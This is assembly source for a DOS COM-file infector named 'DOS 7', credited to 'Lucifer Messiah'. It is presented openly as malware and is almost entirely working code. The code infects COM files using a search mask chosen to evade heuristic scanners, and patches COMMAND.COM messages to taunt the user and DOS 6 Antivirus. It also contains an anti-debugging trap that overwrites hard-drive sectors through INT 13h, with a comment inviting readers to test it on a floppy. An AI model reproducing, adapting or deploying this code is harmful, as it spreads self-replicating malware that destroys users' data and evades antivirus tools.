               .model  tiny
               .code
                org    100h

; NOTE: The next 2 lines work as written in a debugger, but when 
;       executed in DOS, the second line is skipped.

DOS_7:
          mov     word ptr [offset AD_Marker - 2],offset Kill_HD
          mov     ax,offset Second_Entry      ;Prepare to overwrite HD
                                              ;if debugger is being used
AD_Marker:
          mov     word ptr Prefetch,ax        ;Store the offset
          sub     ax,ax                       ; of our future INT 0
          push    ds
          mov     ds,ax
          mov     es,ax
          mov     si,21h*4
          mov     di,3*4                      ;INT 3 = INT 21h
          movsw                               ; (See Chapter 5 for
          movsw                               ; explanation of this
                                              ; technique)

          mov      ax,word ptr es:[0]         ;Save INT 0
          mov      word ptr cs:Orig_0,ax
          mov      ax,word ptr es:[2]
          mov      word ptr cs:Orig_2,ax         ;Point INT 0 to code
          mov      word ptr es:[0],'ML'       ; in our high segment
Prefetch        EQU      $-2

; NOTE: At this point, Interrupt 0 (automatically invoked by a divide-
;       by-zero error) is revectored to Second_Entry if a debugger isn't 
;       being used, but to Anti_Debug if one is.

          pop     ds
          mov     ax,ds
          add     ah,10h                      ;New segment is 65535
          mov     es:[2],ax                   ; bytes above this one
                                              ; (Max length for COMs)
          mov     es,ax
          mov     di,100h
          mov     si,di
          mov     cx,(Host-DOS_7)
          rep     movsb                       ;Move virus to new segment
          mov     ds,ax
          div     cx                          ;Invoke divide-by-0 error.

; NOTE: All code following this point is executed in the higher segment

;--- Subroutines for infection ----------------------------

Close_File:
          mov     ah,3Eh
          int     3

Find_Next:
          mov     ah,4Fh
          int     3
          jmp     short ID_Check

;--- Second_Entry for Debugger ONLY -----------------------

Kill_HD:                                            ;Executed ONLY by
          sub     cx,cx                       ; debugging

Anti_Debug:
          inc     cx                          ;Overwrite sectors on
          push    cs                          ; the hard drive,
          pop     es                          ; starting at sector 1
          mov     ax,0FE05h                   ; going upwards
          jmp     $-2
          sub     ax,0E702h                   ;AX=301h
          mov     bh,1
          mov     dx,80h                      ;Write on hard drive!
                                              ; NOTE: Change this value
                                              ; to 0 or 1 (A: or B:) if
                                              ; you wish to try this out
          int     13h
          jmp     short Anti_Debug

;--- Normal Second_Entry ----------------------------------

Second_Entry:
          push    es
          push    cx

          pop     es
          mov     word ptr es:[0],'ML'        ;Restore INT 0 so
Orig_0    equ     $-2                         ; computer doesn't
          mov     word ptr es:[2],'SA'        ; crash on divide-by-zero
Orig_2    equ     $-2
          pop     es

          mov     word ptr [offset AD_Marker - 2],offset Second_Entry
                                              ;Reset virus to
                                              ; original state,
                                              ; otherwise infected files
                                              ; will only run Kill_HD

          mov     ah,1Ah                      ;Set DTA
          cwd
          int     3
          mov     ah,4Eh                      ;Open file
          sub     cx,cx
          mov     dx,offset Filespec
          int     3

ID_Check:
          jc      restore_host                ;No file found
          mov     ax,3D02h
          mov     dx,1Eh                      ;File name in DTA
          int     3
          jc      Find_Next

          mov     bx,ax
          mov     ah,3Fh                      ;Read from file
          mov     di,1Ah
          mov     cx,[di]
          mov     dx,si
          int     3
          mov     ax,[si]
          jc      Find_Next

          cmp     ax,word ptr [DOS_7]         ;Infected already?
          je      Close_File
          mov     ax,[si+2]                   ;Look at 3rd and 4th bytes
          cmp     ax,6015h                    ;Same as DOS 6'S COMMAND?
          je      COMMAND_COM
          jmp     short Infect                ;Infect as normal file

;--- Following routines alter messages in COMMAND.COM -----

COMMAND_COM:
          push    di
          push    si

          lea     si,antivirus
          mov     di,23F0h                    ;DOS copyright notice
          mov     cx,antiviruslen
          cld
          repz    movsb

          lea     si,msg
          mov     di,9057h                    ;"Disk in drive XX has no
          mov     cx,msglen                   ; label"
          repz    movsb

          lea     si,msg2
          mov     di,914Ch                    ;"Bad command or filename"
          mov     cx,msg2len
          repz    movsb

          mov     ax,4200h
          sub     dx,dx
          mov     cx,dx
          int     3

          mov     ah,40h                      ;Write patched COMMAND.COM
          lea     dx,host                     ; back to disk
          mov     cx,52925d
          int     3

          mov     ah,3Eh                      ;close COMMAND.COM
          int     3
          pop     si
          pop     di
          jmp     short Restore_Host

;--- Infect file as a normal COM file (Not COMMAND.COM) ---

Infect:
          mov     ax,4200h                    ;Go to start of file
          sub     dx,dx
          mov     cx,dx
          int     3

          inc     dh                          ; DX=100h
          mov     ah,40h                      ;Write virus to file
          mov     cx,word ptr [di]
          add     cx,offset Host - 100h
          int     3

          mov     ah,3Eh                      ;Close infected file
          int     3

Restore_Host:
          mov     ax,ss                       ;Restore ES and DS
          mov     es,ax
          mov     ds,ax
          push    ax                          ;Prepare to RETF to host
          mov     ah,1Ah
          shr     dx,1                        ;Restore DTA
          int     3
          mov     di,100h
          push    di                          ;Push proper COM entry
          mov     cx,sp                       ; point onto stack
          sub     cx,si
          rep     movsb                       ;Move host to proper ofs
          retf                                ; and Execute it

;--- Virus Data -------------------------------------------

Filespec  db      '*W.C?M',0                  ;Avoid heuristic scanners
                                              ; from reporting that the
                                              ; infected files search
                                              ; for COM files
MSG       db      'is infected!'
msglen    equ     $ - msg

MSG2      db      'oy, are you ever dumb! '
msg2len   equ     $ - msg2

antivirus db      'MSDOS 7 (C)1993 ANARKICK SYSTEMS',0Dh,0Ah
          db      1,1,1
          db    '     DOS 6 Antivirus sucks. It missed this one! '
antiviruslen      equ     $ - antivirus

;--- Host file is appended here ---------------------------

         db       '$'   ; for part of the host

Host:
          mov     ah,9
          mov     dx,offset (message - host + 100h)
          int     3
          mov     ah,4CH
          int     3

message   db      '[DOS 7v'
          db      1,1,1, '] Lucifer Messiah$'

          END     DOS_7

